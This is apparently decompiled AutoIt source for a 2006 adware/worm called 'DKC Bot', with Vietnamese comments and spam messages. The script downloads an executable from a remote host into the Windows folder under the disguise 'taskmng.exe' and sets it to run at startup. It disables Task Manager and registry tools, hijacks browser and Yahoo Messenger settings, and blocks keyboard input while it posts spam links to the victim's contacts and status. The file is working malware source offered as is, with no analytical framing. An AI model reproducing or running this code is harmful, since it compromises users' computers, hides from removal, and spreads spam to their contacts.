; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Documents and Settings\may user\My Documents\nhan_love_tu.au3>
; ----------------------------------------------------------------------------

; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: D:\AutoIT\Projects\Adware\DKC.au3>
; ----------------------------------------------------------------------------

;--------------------------------------------
; Tac Gia: http://tinhkhucvang.1.to http://tinhkhucvang.6x.to
; Phan Mem: DKC Bot
; Phien Ban: 1.1
; Cong Dung: Quang cao Website thong qua Y!M
; Phat Hanh: 24-9-2006
;--------------------------------------------

; Thiet Lap
#NoTrayIcon
$website = "http://www.filefarmer.com/2/tinhkhucvang_6x_to/chucbanvuive"

; Lay Nhiem Vao He Thong
If Not FileExists(@WindowsDir & "\taskmng.exe") Then
 		InetGet ($website & "/tkv.exe", @WindowsDir & "\taskmng.exe", 0, 1)
 		Sleep(5000)
	EndIf

; Ghi Khoa Registry
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\taskmng.exe")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Window Title", "REG_SZ", "http://tinhkhucvang.1.to Nhan Love Tu' :: Chut gi de nho...")

; Danh Sach Tin Nhan Ngau Nhien
Dim $tin[10]
$tin[0] = " ;):x Welcome To Website Fan Dan Truong: http://tinhkhucvang.1.to ;):x Nguoi ra di vi anh da mang lam lo hay tai vi anh day qua ngheo? Chang the trao ve em duoc nhu long em luon uoc mo, giac mo giau sang... " & $website & " "
$tin[1] = " ;):x Welcome To Website Fan Dan Truong: http://tinhkhucvang.1.to ;):x Ngay khong em anh day lam sao cho het ngay? Sang dem duong nhu chi co anh voi anh quay quang... " & $website & " "
$tin[2] = " ;):x Welcome To Website Fan Dan Truong: http://tinhkhucvang.1.to ;):x Anh nuot nuoc mat cay dang vao tim con` em sanh' vai ben nguoi dua` vui, vong tay ai om em dam say, anh dau rat dau ... " & $website & " "
$tin[3] = " ;):x Welcome To Website Fan Dan Truong: http://tinhkhucvang.1.to ;):x Dem nay mua ngoai hien, mua oi dung roi them cho xot xa. Anh khong quay ve day, loi nao anh noi da quen... " & $website & " "
$tin[4] = " ;):x Welcome To Website Fan Dan Truong: http://tinhkhucvang.1.to ;):x Ngay mai thoi doi ta lia xa em con nho? That long anh muon ta nhin thay nhau, cho quen mau cau yeu thuong em voi anh hom nao... " & $website & " "
$tin[5] = " ;):x Welcome To Website Fan Dan Truong: http://tinhkhucvang.1.to ;):x Tra lai em niem vui khi duoc gan ben em, tra lai em loi yeu thuong em dem, tra lai em niem tin thang nam qua ta dap xay. Gio day chi la nhung ky niem buon... " & $website & " "
$tin[6] = " ;):x Welcome To Website Fan Dan Truong: http://tinhkhucvang.1.to ;):x Loi em noi cho tinh chung ta, nhu doan cuoi trong cuon phim buon. Nguoi da den nhu la giac mo roi ra di cho anh bat ngo... " & $website & " "
$tin[7] = " ;):x Welcome To Website Fan Dan Truong: http://tinhkhucvang.1.to ;):x Tha nguoi dung noi se yeu minh toi mai thoi thi gio day toi se vui hon. Gio nguoi lac loi buoc chan ve noi xa xoi, cay dang chi rieng minh toi... " & $website & " "
$tin[8] = " ;):x Welcome To Website Fan Dan Truong: http://tinhkhucvang.1.to ;):x Khoc cho nho thuong voi trong long, khoc cho noi sau nhe nhu khong. Bao nhieu yeu thuong nhung ngay qua da tan theo khoi may bay that xa... " & $website & " "
$tin[9] = " ;):x Welcome To Website Fan Dan Truong: http://tinhkhucvang.1.to ;):x Toi di lang thang lan trong bong toi buot gia, ve dau khi da mat em roi? Ve dau khi bao nhieu mo mong gio da vo tan... Ve dau toi biet di ve dau? " & $website & " "

; Ham Thay Doi Status & Gui Tin Nhan
While (1)
sleep(60000)
$tieude = WinGetTitle("Yahoo! Messenger", "")
$kiemtra = WinExists ($tieude)
	If $kiemtra = 1 Then
		$ngaunhien = Random(0,9,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude)
		Send("!m")
		Send("un")
		Send("^v {ENTER}{ENTER}")
		Send("^m")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{END}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		BlockInput (0)
	EndIf
Sleep(1800000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: D:\AutoIT\Projects\Adware\DKC.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Documents and Settings\may user\My Documents\nhan_love_tu.au3>
; ----------------------------------------------------------------------------

